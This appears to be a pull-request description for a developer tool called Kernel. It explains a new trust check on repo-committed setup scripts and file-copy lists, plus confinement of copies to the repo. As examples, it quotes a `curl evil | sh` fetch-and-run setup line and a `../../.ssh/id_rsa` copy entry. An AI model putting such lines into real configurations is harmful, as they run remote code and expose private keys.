**A room's scripts and files.copy list run only after the user trusts that exact text, and files.copy can't leave the repo.** `.kernel/settings.toml` is meant to be committed, and `scripts.setupOnCreate` defaults to true. Cloning a hostile repo, or pulling a teammate's change to that file, used to run its setup script in the login shell for the next workspace, with the user's rights. A `files.copy` entry like `../../.ssh/id_rsa`, or a symlink pointing out of the repo, copied that file into the worktree, where the agent could read it.

Kernel now hashes the repo's text that the room would run: the setup, run and archive scripts and the files.copy list, each as the room reads it after merging the two files (`scriptsToTrust` and `trustHash` in `services/settings.ts`). Since KERNEL-190 the personal file is the room pages' default, and `loadRepoSettings` says where each value came from. A value counts as the repo's text when it comes from `settings.toml`, or from a `settings.local.toml` that git tracks, because then a commit brought it. A value from the user's own personal file, which git doesn't track, is their text and runs without asking, like a Settings save. A value the other file overrides never runs, so it isn't hashed or shown. Only text counts. Each file is read through a whitelist that keeps a script only when it is a string and files.copy only when it is a list, keeping its string entries. So `setup = ["curl evil | sh"]` reads as no script, and a wrongly typed value in one file can't hide the other file's script. What Kernel hashes is exactly what it runs. Kernel's default copy list (`.env`, `.env.local`) needs no trusting, even when a file sets it. A room with nothing else has nothing to trust. The trusted hashes live per room in `trust.json` in Kernel's data folder, never in the repo, so a commit can't trust itself. Each room keeps its last 20, so going back to an older version doesn't ask again. Removing a room forgets them.

A new workspace whose room text isn't trusted is created with its worktree and its node_modules link, and nothing else. It gets the status `trust`. Its brief, and any Lead messages sent after it, wait in the chat's queue the way they wait for a failed setup. A workspace is held even when only one of the texts would ever run in it, for example when Run setup when a workspace is created is off. The rule is the room's text, not the workspace's use of it. Kernel pushes `room.trust` with the scripts, the copy list, the hash and the held workspace ids. `rooms.scriptTrust` returns the same thing on demand, or null. `rooms.trust({ roomId, hash })` saves the hash and releases every held workspace in the room. Each one copies its files, runs setup and sends its brief, the same as a workspace that never waited, and a failed setup ends in `failed` with Run again as before. If the text changed after the user read it, the hash no longer matches and `rooms.trust` rejects and pushes the new text. A held workspace keeps its queue across a restart. Sessions restores held queues only for failed setups, so Kernel holds a `trust` workspace's queue again itself as it starts. The same goes for a workspace whose setup trusting started when Kernel quit. Its brief waits in the chat's queue rather than in a `setups` hold, so Kernel restores that queue, marks the workspace failed with the usual note, and Run again sends it once setup passes.

The same check covers every other place the text runs. Run again and the Setup and Run buttons ask for trust instead of running. On a held workspace whose text is trusted by then, they release it the way `rooms.trust` does. Run after setup is skipped. Archiving never waits: an untrusted archive script is skipped, with a line in the archive output, and the workspace archives. Restore skips the copy and says so in the setup output.

Two writers count as trusted without asking. The first is a save in Settings. A save into the user's own personal file needs nothing, since that text is theirs. A save into `settings.toml`, or into a personal file a commit brought, trusts the result only when the room's text was trusted before the save. Every repo value the room now runs must also be unchanged, or written by this save into the file it now comes from. No Settings page shows every script and the copy list, and a page shows the text as it was when it opened, which a pull may have changed since. So editing the setup script can't vouch for an archive script or a `../../.ssh/id_rsa` copy entry the user never saw. Clearing a personal override can't wave through the repo's script it was hiding either. In those cases the dialog, which shows everything, decides. Other room settings, like the Linear team, the run mode or the node_modules link, trust nothing. The second is the settings.toml Kernel writes for a new room, holding its own install command (D-078). A repo that brought its own settings.toml is not trusted, and neither is a new room whose repo committed a settings.local.toml. One judgment call: an agent working in the main checkout, like the Lead's current-branch workspace, could write the personal file, and Kernel would run that text without asking. An agent there can already run commands through Bash under the user's permission rules, so this isn't new reach, but those rules don't apply to scripts Kernel runs.

`copyLocalFiles` resolves each entry with `realpath` and refuses anything outside the repo root: `../` paths, absolute paths, and symlinks in the repo that point out. It also refuses to write through a symlink in the worktree, a file or a folder on the way, since a repo can commit those too. Missing files are skipped quietly as before. The setup output names each refused entry. Confinement applies to trusted text too.

Trust covers the text, not what it calls. Trusting `setup = "./setup.sh"` or `pnpm install` doesn't cover a later change to `setup.sh` or to a package's install scripts.

Existing rooms get no free pass after the upgrade. A room that already has scripts or its own copy list has no trusted hash yet, so its next workspace asks once. After that, unchanged text never asks again.

Until the trust dialog and banner land (KERNEL-218), nothing in the renderer calls `rooms.trust`, so held workspaces wait. The Lead's own workspace, which runs no setup, isn't held. The Lead's `create_workspace` result doesn't yet say a workspace is waiting for trust, but `message_agent` does (KERNEL-261). The room setup's "Install dependencies" step, which runs the lockfile's install command in a fresh clone, is not covered here (KERNEL-260). KERNEL-209.
